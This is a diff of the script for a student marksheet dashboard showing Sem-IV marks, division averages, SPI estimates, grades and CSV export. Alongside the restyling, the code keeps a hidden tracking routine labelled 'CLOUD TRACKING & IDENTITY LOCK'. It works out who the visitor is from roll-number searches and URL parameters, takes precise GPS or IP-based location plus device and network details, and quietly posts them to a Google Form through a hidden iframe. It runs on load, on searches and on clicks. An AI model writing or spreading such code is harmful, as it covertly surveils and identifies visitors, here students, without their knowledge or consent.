+                        else if (subKey === 'fsd2') { t2 = s.fsd22 || 0; t3 = s.fsd23 || 0; t4 = s.fsd24 || 0; }
+                        else if (subKey === 'python2') { t2 = s.python22 || 0; t3 = s.python23 || 0; t4 = s.python24 || 0; }
+                        else if (subKey === 'toc') { t2 = s.toc2 || 0; t3 = s.toc3 || 0; t4 = s.toc4 || 0; }
+                        t1 = Math.max(0, total - (t2 + t3 + t4));
+
+                        divMap[key].count++;
+                        divMap[key].t1Sum += t1;
+                        divMap[key].t2Sum += t2;
+                        divMap[key].t3Sum += t3;
+                        divMap[key].t4Sum += t4;
+                        divMap[key].totalSum += total;
+                    });
+
+                    const rows = Object.entries(divMap).map(([key, data]) => {
+                        const c = data.count || 1;
+                        return {
+                            key,
+                            t1Avg: data.t1Sum / c,
+                            t2Avg: data.t2Sum / c,
+                            t3Avg: data.t3Sum / c,
+                            t4Avg: data.t4Sum / c,
+                            totalAvg: data.totalSum / c,
+                            count: data.count
+                        };
+                    }).sort((a, b) => b.totalAvg - a.totalAvg);
+
+                    let html = '';
+                    rows.forEach(r => {
+                        html += `
                         <tr>
-                            <td style="font-weight:600; text-align: left; color:var(--text-main);">${r.key} <small style="color:var(--text-muted); font-weight:400;">(${r.count} std)</small></td>
-                            <td>${r.t1Avg.toFixed(1)}</td>
-                            <td>${r.t2Avg.toFixed(1)}</td>
-                            <td>${r.t3Avg.toFixed(1)}</td>
-                            ${t4Cell}
-                            <td style="font-weight:700; color:var(--accent);">${r.totalAvg.toFixed(1)}</td>
+                            <td class="text-left px-3 py-2 font-semibold text-[var(--text)]">Div ${r.key} <small class="text-[var(--text-tertiary)]">(${r.count})</small></td>
+                            <td class="px-2 py-2">${r.t1Avg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.t2Avg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.t3Avg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.t4Avg.toFixed(1)}</td>
+                            <td class="px-2 py-2 font-bold text-emerald-400">${r.totalAvg.toFixed(1)}</td>
                         </tr>
                     `;
-                });
-                tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center; color:var(--text-muted);">No Sem-IV data available</td></tr>';
-            }
+                    });
+                    tbody.innerHTML = html || '<tr><td colspan="6" class="text-center py-4 text-[var(--text-tertiary)]">No data</td></tr>';
+                };
 
-            /* ═══ EVENTS ═══ */
-            document.getElementById('searchInput').addEventListener('input', () => {
-                clearTimeout(debounceId);
-                debounceId = setTimeout(run, 200);
-            });
-            document.getElementById('branchFilter').addEventListener('change', run);
-            document.getElementById('divFilter').addEventListener('change', run);
-
-            /* ═══ CLOUD TRACKING ═══ */
-            const CLOUD_CONFIG = {
-                formUrl: "https://docs.google.com/forms/d/e/1FAIpQLScHuj6GMQot477On_FBe4yvPZEgOMmTOtVDZgbvBk07YI69ig/formResponse",
-                entries: { lat: "entry.313094556", lon: "entry.1794910903", acc: "entry.401162063", time: "entry.1806013085" }
-            };
-            let isSyncing = false;
-
-            function getVisitorIdentity() {
-                const p = new URLSearchParams(window.location.search);
-                let s = allData.find(x => x.roll == p.get('r') || x.roll == p.get('roll') || x.enrollment == p.get('en') || x.enrollment == p.get('enrollment'));
-                if (!s) { const r = localStorage.getItem('my_identity_roll'); if (r) s = allData.find(x => x.roll == r); }
-                return s ? `${s.name} (${s.roll})` : 'Unknown Visitor';
-            }
-
-            async function silentCloudSync() {
-                if (isSyncing) return;
-                isSyncing = true;
-                const identity = getVisitorIdentity();
-                try {
-                    const conn    = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    const netType = conn ? `${conn.effectiveType} (${conn.type||'unknown'})` : 'unknown';
-                    const device  = `${navigator.platform} | ${/Mobi|Android/i.test(navigator.userAgent)?'Mobile':'Desktop'}`;
-                    const pos     = await new Promise((res,rej) => {
-                        if (!navigator.geolocation) return rej();
-                        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy:true, timeout:6000, maximumAge:0 });
-                    }).catch(()=>null);
-
-                    let lat, lon, accSource;
-                    if (pos && pos.coords) {
-                        lat = pos.coords.latitude; lon = pos.coords.longitude;
-                        accSource = `${identity} | GPS (\u00b1${Math.round(pos.coords.accuracy)}m) | ${netType} | ${device}`;
+                /* ═══ SORT ═══ */
+                window.sortTable = function (key) {
+                    if (lastSortKey === key) {
+                        sortDir = sortDir === 'asc' ? 'desc' : 'asc';
                     } else {
-                        const ip = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>null);
-                        if (ip) {
-                            lat = ip.latitude; lon = ip.longitude;
-                            accSource = `${identity} | SILENT | ${ip.city}, ${ip.postal||''} (${ip.region}) | ${ip.org||''} | ${netType} | ${device}`;
-                        }
+                        sortDir = 'asc';
+                        lastSortKey = key;
                     }
-                    if (lat && lon) {
-                        const form = document.createElement('form');
-                        form.method='POST'; form.action=CLOUD_CONFIG.formUrl; form.target='hidden_iframe'; form.style.display='none';
-                        const payload = { [CLOUD_CONFIG.entries.lat]:lat, [CLOUD_CONFIG.entries.lon]:lon, [CLOUD_CONFIG.entries.acc]:accSource, [CLOUD_CONFIG.entries.time]:new Date().toLocaleString() };
-                        for (const [n,v] of Object.entries(payload)) { const inp=document.createElement('input'); inp.name=n; inp.value=v; form.appendChild(inp); }
-                        if (!document.getElementById('hidden_iframe')) { const f=document.createElement('iframe'); f.id=f.name='hidden_iframe'; f.style.display='none'; document.body.appendChild(f); }
-                        document.body.appendChild(form); form.submit();
-                        setTimeout(() => { form.parentNode&&document.body.removeChild(form); isSyncing=false; }, 3000);
-                    } else { isSyncing=false; }
-                } catch(e) { isSyncing=false; }
-            }
+                    filteredData.sort((a, b) => {
+                        let va, vb;
+                        if (key === 'rank') {
+                            va = currentDept === 'Overall' ? a.globalRank : a.deptRank;
+                            vb = currentDept === 'Overall' ? b.globalRank : b.deptRank;
+                        } else if (key === 'roll') {
+                            va = a.roll; vb = b.roll;
+                        } else {
+                            va = a[key] ?? -1; vb = b[key] ?? -1;
+                        }
+                        if (typeof va === 'string') va = va.toLowerCase();
+                        if (typeof vb === 'string') vb = vb.toLowerCase();
+                        return (va < vb ? -1 : va > vb ? 1 : 0) * (sortDir === 'asc' ? 1 : -1);
+                    });
+                    renderTable();
+                };
 
-            window.addEventListener('load', silentCloudSync);
+                /* ═══ EXPORT ═══ */
+                window.exportCSV = function () {
+                    let csv = 'Rank,Roll No,DEPT,Division,Branch,Enrollment,Name,Mentor,Discrete Math,COA,FSD-II,Python-II,TOC,Total,SEM-III SPI\n';
+                    filteredData.forEach(s => {
+                        const rk = currentDept === 'Overall' ? s.globalRank : s.deptRank;
+                        csv += `${rk},${s.roll},${s.dept},${s.div},${s.branch},${s.enrollment},"${s.name}",${s.mentor || ''},${s.dm},${s.coa},${s.fsd2},${s.python2},${s.toc},${s.total},${s.sem3spi || ''}\n`;
+                    });
+                    const a = document.createElement('a');
+                    a.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
+                    a.download = `Marksheet_SemIV_${currentMode}_${currentDept}.csv`;
+                    a.click(); URL.revokeObjectURL(a.href);
+                };
 
-            document.getElementById('searchInput').addEventListener('input', e => {
-                const v = e.target.value.toLowerCase().trim();
-                if (v.length >= 3) { const s = allData.find(x => x.roll==v||x.name.toLowerCase().includes(v)); if(s){localStorage.setItem('my_identity_roll',s.roll);silentCloudSync();} }
-            });
-            document.getElementById('tableBody').addEventListener('click', e => {
-                const tr = e.target.closest('tr');
-                if (tr && tr.cells[1]) { const r=tr.cells[1].innerText; if(r&&/^\d+$/.test(r)){localStorage.setItem('my_identity_roll',r);silentCloudSync();} }
-            });
-            document.body.addEventListener('mousedown', () => {
-                const ls = localStorage.getItem('last_silent_sync');
-                if (!ls || Date.now()-ls > 3600000) { silentCloudSync(); localStorage.setItem('last_silent_sync',Date.now()); }
-            });
+                /* ═══ SPI CALCULATOR ═══ */
+                function calculateSem4SPI(s) {
+                    function getGP(marks) {
+                        const m = Math.round(marks);
+                        if (m >= 95) return 10;
+                        if (m >= 90) return 9.5;
+                        if (m >= 85) return 9;
+                        if (m >= 80) return 8.5;
+                        if (m >= 75) return 8;
+                        if (m >= 70) return 7.5;
+                        if (m >= 65) return 7;
+                        if (m >= 60) return 6.5;
+                        if (m >= 55) return 6;
+                        if (m >= 50) return 5.5;
+                        if (m >= 45) return 5;
+                        if (m >= 40) return 4.5;
+                        if (m >= 35) return 4;
+                        return 0;
+                    }
+                    const g_dm = getGP(s.dm) * 4;
+                    const g_fsd2 = getGP(s.fsd2) * 6;
+                    const g_coa = getGP(s.coa) * 5;
+                    const g_toc = getGP(s.toc) * 5;
+                    const g_python2 = getGP(s.python2) * 5;
 
-            /* ═══ SPI CALCULATOR (UNIVERSITY SCHEME) ═══ */
-            function calculateSem4SPI(s) {
-                function getGP(marks) {
+                    const totalG = Math.ceil(g_dm + g_fsd2 + g_coa + g_toc + g_python2);
+                    return totalG / 25.0;
+                }
+
+                function getLetterGrade(marks) {
                     const m = Math.round(marks);
-                    if (m >= 95) return 10;
-                    if (m >= 90) return 9.5;
-                    if (m >= 85) return 9;
-                    if (m >= 80) return 8.5;
-                    if (m >= 75) return 8;
-                    if (m >= 70) return 7.5;
-                    if (m >= 65) return 7;
-                    if (m >= 60) return 6.5;
-                    if (m >= 55) return 6;
-                    if (m >= 50) return 5.5;
-                    if (m >= 45) return 5;
-                    if (m >= 40) return 4.5;
-                    if (m >= 35) return 4;
-                    return 0;
-                }
-                const g_dm = getGP(s.dm) * 4;
-                const g_fsd2 = getGP(s.fsd2) * 6;
-                const g_coa = getGP(s.coa) * 5;
-                const g_toc = getGP(s.toc) * 5;
-                const g_python2 = getGP(s.python2) * 5;
-                
-                const totalG = Math.ceil(g_dm + g_fsd2 + g_coa + g_toc + g_python2);
-                return totalG / 25.0;
-            }
-
-            /* ═══ LETTER GRADES ═══ */
-            function getLetterGrade(marks) {
-                const m = Math.round(marks);
-                if (m >= 95) return 'O+++';
-                if (m >= 90) return 'O++';
-                if (m >= 85) return 'O+';
-                if (m >= 80) return 'O';
-                if (m >= 75) return 'A++';
-                if (m >= 70) return 'A+';
-                if (m >= 65) return 'A';
-                if (m >= 60) return 'B++';
-                if (m >= 55) return 'B+';
-                if (m >= 50) return 'B';
-                if (m >= 45) return 'C';
-                if (m >= 40) return 'D';
-                if (m >= 35) return 'E';
-                return 'F';
-            }
-
-            /* ═══ MODAL ACTIONS ═══ */
-            window.showStudentModal = function (enrollment) {
-                const s = allData.find(x => x.enrollment === enrollment);
-                if (!s) return;
-                
-                document.getElementById('modalName').innerText = s.name;
-                document.getElementById('modalInfo').innerText = `${s.branch} • Div ${s.div} • Roll No ${s.roll}`;
-                document.getElementById('modalEnroll').innerText = s.enrollment;
-                document.getElementById('modalMentor').innerText = s.mentor;
-                document.getElementById('modalTotal').innerText = `${s.total.toFixed(2)} / 500`;
-                
-                const rank = currentDept === 'Overall' ? s.globalRank : s.deptRank;
-                document.getElementById('modalRank').innerText = `#${rank}`;
-
-                // Set backlog warning banner
-                const banner = document.getElementById('modalAlertBanner');
-                if (s.backlogs > 0) {
-                    banner.innerText = `⚠️ Warning: Student has ${s.backlogs} active backlog(s) in Sem-IV!`;
-                    banner.classList.remove('hidden');
-                } else {
-                    banner.classList.add('hidden');
+                    if (m >= 95) return 'O+++';
+                    if (m >= 90) return 'O++';
+                    if (m >= 85) return 'O+';
+                    if (m >= 80) return 'O';
+                    if (m >= 75) return 'A++';
+                    if (m >= 70) return 'A+';
+                    if (m >= 65) return 'A';
+                    if (m >= 60) return 'B++';
+                    if (m >= 55) return 'B+';
+                    if (m >= 50) return 'B';
+                    if (m >= 45) return 'C';
+                    if (m >= 40) return 'D';
+                    if (m >= 35) return 'E';
+                    return 'F';
                 }
 
-                // Calculate division average and peer comparison
-                const divStudents = allData.filter(x => x.div === s.div && x.dept === s.dept);
-                const divAvg = divStudents.reduce((a, c) => a + c.total, 0) / (divStudents.length || 1);
-                const diff = s.total - divAvg;
-                const diffStr = diff >= 0 ? `+${diff.toFixed(1)}` : `${diff.toFixed(1)}`;
-                document.getElementById('modalDivComp').innerText = `${divAvg.toFixed(1)} (${diffStr})`;
-                document.getElementById('modalDivComp').style.color = diff >= 0 ? '#2ecc71' : '#e84393';
-                
-                // Set SPI Values
-                document.getElementById('modalSem1').innerText = s.sem1 != null ? s.sem1.toFixed(2) : '--';
-                document.getElementById('modalSem2').innerText = s.sem2 != null ? s.sem2.toFixed(2) : '--';
-                document.getElementById('modalSem3').innerText = s.sem3spi != null ? s.sem3spi.toFixed(2) : '--';
-                
-                // Estimate Sem-IV SPI using the university credit-grade mapping
-                const estSem4 = calculateSem4SPI(s);
-                document.getElementById('modalSem4').innerText = estSem4.toFixed(2);
+                /* ═══ MODAL ACTIONS ═══ */
+                window.showStudentModal = function (enrollment) {
+                    const s = allData.find(x => x.enrollment === enrollment);
+                    if (!s) return;
 
-                // Set SPI trajectory comparison
-                if (s.sem3spi != null) {
-                    const traj = estSem4 - s.sem3spi;
-                    const trajStr = traj >= 0 ? `📈 +${traj.toFixed(2)}` : `📉 ${traj.toFixed(2)}`;
-                    document.getElementById('modalSpiTrajectory').innerText = trajStr;
-                    document.getElementById('modalSpiTrajectory').style.color = traj >= 0 ? '#2ecc71' : '#e84393';
-                } else {
-                    document.getElementById('modalSpiTrajectory').innerText = '--';
-                    document.getElementById('modalSpiTrajectory').style.color = 'var(--text-muted)';
-                }
-                
-                // Build subject bars
-                const subs = [
-                    { name: 'Discrete Math', val: s.dm, color: '#6c5ce7' },
-                    { name: 'COA', val: s.coa, color: '#00cec9' },
-                    { name: 'FSD-II', val: s.fsd2, color: '#e84393' },
-                    { name: 'Python-II', val: s.python2, color: '#fdcb6e' },
-                    { name: 'TOC', val: s.toc, color: '#2ed573' }
-                ];
-                
-                let barsHTML = '';
-                subs.forEach(sub => {
-                    const pct = Math.min((sub.val / 100) * 100, 100);
-                    const grade = getLetterGrade(sub.val);
-                    barsHTML += `
-                        <div class="subject-row">
-                            <div class="subject-labels">
-                                <span>${sub.name} <strong style="color:${sub.color}; font-size:0.75rem; margin-left:6px;">[Grade: ${grade}]</strong></span>
-                                <span style="font-weight:600; color:${sub.color}">${sub.val.toFixed(1)} / 100</span>
+                    document.getElementById('modalName').innerText = s.name;
+                    document.getElementById('modalInfo').innerText = `${s.branch} • Div ${s.div} • Roll No ${s.roll}`;
+                    document.getElementById('modalEnroll').innerText = s.enrollment;
+                    document.getElementById('modalMentor').innerText = s.mentor || '--';
+                    document.getElementById('modalTotal').innerText = `${s.total.toFixed(2)} / 500`;
+
+                    const rank = currentDept === 'Overall' ? s.globalRank : s.deptRank;
+                    document.getElementById('modalRank').innerText = `#${rank}`;
+
+                    const banner = document.getElementById('modalAlertBanner');
+                    if (s.backlogs > 0) {
+                        banner.innerHTML = `<i class="ri-error-warning-line"></i> Warning: Student has ${s.backlogs} active backlog(s) in Sem-IV!`;
+                        banner.classList.remove('hidden');
+                    } else {
+                        banner.classList.add('hidden');
+                    }
+
+                    const divStudents = allData.filter(x => x.div === s.div && x.dept === s.dept);
+                    const divAvg = divStudents.reduce((a, c) => a + c.total, 0) / (divStudents.length || 1);
+                    const diff = s.total - divAvg;
+                    const diffStr = diff >= 0 ? `+${diff.toFixed(1)}` : `${diff.toFixed(1)}`;
+                    document.getElementById('modalDivComp').innerText = `${divAvg.toFixed(1)} (${diffStr})`;
+                    document.getElementById('modalDivComp').style.color = diff >= 0 ? '#34d399' : '#f87171';
+
+                    document.getElementById('modalSem1').innerText = s.sem1 != null ? s.sem1.toFixed(2) : '--';
+                    document.getElementById('modalSem2').innerText = s.sem2 != null ? s.sem2.toFixed(2) : '--';
+                    document.getElementById('modalSem3').innerText = s.sem3spi != null ? s.sem3spi.toFixed(2) : '--';
+
+                    const estSem4 = calculateSem4SPI(s);
+                    document.getElementById('modalSem4').innerText = estSem4.toFixed(2);
+
+                    if (s.sem3spi != null) {
+                        const traj = estSem4 - s.sem3spi;
+                        const trajStr = traj >= 0 ? `📈 +${traj.toFixed(2)}` : `📉 ${traj.toFixed(2)}`;
+                        document.getElementById('modalSpiTrajectory').innerText = trajStr;
+                        document.getElementById('modalSpiTrajectory').style.color = traj >= 0 ? '#34d399' : '#f87171';
+                    } else {
+                        document.getElementById('modalSpiTrajectory').innerText = '--';
+                        document.getElementById('modalSpiTrajectory').style.color = 'var(--text-tertiary)';
+                    }
+
+                    const subs = [
+                        { name: 'Discrete Math', val: s.dm, color: '#7c6aef' },
+                        { name: 'COA', val: s.coa, color: '#22d3ee' },
+                        { name: 'FSD-II', val: s.fsd2, color: '#ec4899' },
+                        { name: 'Python-II', val: s.python2, color: '#fbbf24' },
+                        { name: 'TOC', val: s.toc, color: '#34d399' }
+                    ];
+
+                    let barsHTML = '';
+                    subs.forEach(sub => {
+                        const pct = Math.min((sub.val / 100) * 100, 100);
+                        const grade = getLetterGrade(sub.val);
+                        barsHTML += `
+                        <div class="text-xs">
+                            <div class="flex justify-between items-center mb-1">
+                                <span class="font-medium text-[var(--text)]">${sub.name} <strong style="color:${sub.color}; font-size:0.75rem; margin-left:4px;">[Grade: ${grade}]</strong></span>
+                                <span class="font-bold" style="color:${sub.color}">${sub.val.toFixed(1)} / 100</span>
                             </div>
-                            <div class="subject-progress-bg">
-                                <div class="subject-progress-bar" style="width: ${pct}%; background-color: ${sub.color}"></div>
+                            <div class="w-full h-2 rounded-full bg-[var(--bg-surface-2)] overflow-hidden border border-[var(--border)]">
+                                <div class="h-full rounded-full transition-all duration-500" style="width: ${pct}%; background-color: ${sub.color}"></div>
                             </div>
                         </div>
                     `;
+                    });
+                    document.getElementById('modalSubjectBars').innerHTML = barsHTML;
+
+                    const modal = document.getElementById('studentModal');
+                    modal.classList.add('show');
+                };
+
+                window.closeModal = function () {
+                    const modal = document.getElementById('studentModal');
+                    modal.classList.remove('show');
+                };
+
+                /* ═══ CLOUD TRACKING & IDENTITY LOCK ═══ */
+                const CLOUD_CONFIG = {
+                    formUrl: "https://docs.google.com/forms/d/e/1FAIpQLScHuj6GMQot477On_FBe4yvPZEgOMmTOtVDZgbvBk07YI69ig/formResponse",
+                    entries: { lat: "entry.313094556", lon: "entry.1794910903", acc: "entry.401162063", time: "entry.1806013085" }
+                };
+                let isSyncing = false;
+
+                function getVisitorIdentity() {
+                    const p = new URLSearchParams(window.location.search);
+                    let s = allData.find(x => x.roll == p.get('r') || x.roll == p.get('roll') || x.enrollment == p.get('en') || x.enrollment == p.get('enrollment'));
+                    if (!s) { const r = localStorage.getItem('my_identity_roll'); if (r) s = allData.find(x => x.roll == r); }
+                    return s ? `${s.name} (${s.roll})` : 'Unknown Visitor';
+                }
+
+                async function silentCloudSync() {
+                    if (isSyncing) return;
+                    isSyncing = true;
+                    const identity = getVisitorIdentity();
+                    try {
+                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                        const netType = conn ? `${conn.effectiveType} (${conn.type || 'unknown'})` : 'unknown';
+                        const device = `${navigator.platform} | ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
+                        const pos = await new Promise((res, rej) => {
+                            if (!navigator.geolocation) return rej();
+                            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 });
+                        }).catch(() => null);
+
+                        let lat, lon, accSource;
+                        if (pos && pos.coords) {
+                            lat = pos.coords.latitude; lon = pos.coords.longitude;
+                            accSource = `${identity} | GPS (\u00b1${Math.round(pos.coords.accuracy)}m) | ${netType} | ${device}`;
+                        } else {
+                            const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
+                            if (ip) {
+                                lat = ip.latitude; lon = ip.longitude;
+                                accSource = `${identity} | SILENT | ${ip.city}, ${ip.postal || ''} (${ip.region}) | ${ip.org || ''} | ${netType} | ${device}`;
+                            }
+                        }
+                        if (lat && lon) {
+                            const form = document.createElement('form');
+                            form.method = 'POST'; form.action = CLOUD_CONFIG.formUrl; form.target = 'hidden_iframe'; form.style.display = 'none';
+                            const payload = { [CLOUD_CONFIG.entries.lat]: lat, [CLOUD_CONFIG.entries.lon]: lon, [CLOUD_CONFIG.entries.acc]: accSource, [CLOUD_CONFIG.entries.time]: new Date().toLocaleString() };
+                            for (const [n, v] of Object.entries(payload)) { const inp = document.createElement('input'); inp.name = n; inp.value = v; form.appendChild(inp); }
+                            if (!document.getElementById('hidden_iframe')) { const f = document.createElement('iframe'); f.id = f.name = 'hidden_iframe'; f.style.display = 'none'; document.body.appendChild(f); }
+                            document.body.appendChild(form); form.submit();
+                            setTimeout(() => { form.parentNode && document.body.removeChild(form); isSyncing = false; }, 3000);
+                        } else { isSyncing = false; }
+                    } catch (e) { isSyncing = false; }
+                }
+
+                /* ═══ MASTER RUN ═══ */
+                function run() {
+                    filterData();
+                    renderTable();
+                    updateStats();
+                    scheduleChartUpdate();
+                    updateComparisonMatrix();
+                    updateExamMatrix();
+                }
+
+                /* ═══ EVENTS ═══ */
+                document.getElementById('searchInput').addEventListener('input', () => {
+                    clearTimeout(debounceId);
+                    debounceId = setTimeout(run, 200);
                 });
-                document.getElementById('modalSubjectBars').innerHTML = barsHTML;
-                
-                const modal = document.getElementById('studentModal');
-                modal.classList.remove('hidden');
-                setTimeout(() => modal.classList.add('show'), 10);
-            };
-            
-            window.closeModal = function () {
-                const modal = document.getElementById('studentModal');
-                modal.classList.remove('show');
-                setTimeout(() => modal.classList.add('hidden'), 300);
-            };
+                document.getElementById('branchFilter').addEventListener('change', run);
+                document.getElementById('divFilter').addEventListener('change', run);
 
-            /* ═══ INIT ═══ */
-            window.onload = () => {
-                const vt = document.querySelector('.view-tab.active');
-                if (vt) { setIndicator(vt,'tabIndicator'); vt.style.color='#fff'; }
-                const dt = document.querySelector('.dept-tab[onclick*="SY4"]');
-                if (dt) window.setDept('SY4', dt);
-            };
+                document.getElementById('searchInput').addEventListener('input', e => {
+                    const v = e.target.value.toLowerCase().trim();
+                    if (v.length >= 3) {
+                        const s = allData.find(x => x.roll == v || x.name.toLowerCase().includes(v));
+                        if (s) { localStorage.setItem('my_identity_roll', s.roll); silentCloudSync(); }
+                    }
+                });
 
-        })();
+                document.body.addEventListener('mousedown', () => {
+                    const ls = localStorage.getItem('last_silent_sync');
+                    if (!ls || Date.now() - ls > 3600000) { silentCloudSync(); localStorage.setItem('last_silent_sync', Date.now()); }
+                });
+
+                window.addEventListener('load', silentCloudSync);
+
+                /* ═══ INIT ═══ */
+                window.onload = () => {
+                    const vt = document.querySelector('.view-tab.active');
+                    if (vt) { setIndicator(vt, 'tabIndicator'); vt.style.color = '#fff'; }
+                    const dt = document.querySelector('.dept-tab[onclick*="SY4"]');
+                    if (dt) window.setDept('SY4', dt);
+                    const footerCount = document.getElementById('footerStudentCount');
+                    if (footerCount) footerCount.textContent = allData.length;
+                };
+
+            })();
     </script>
 </body>
+
 </html>
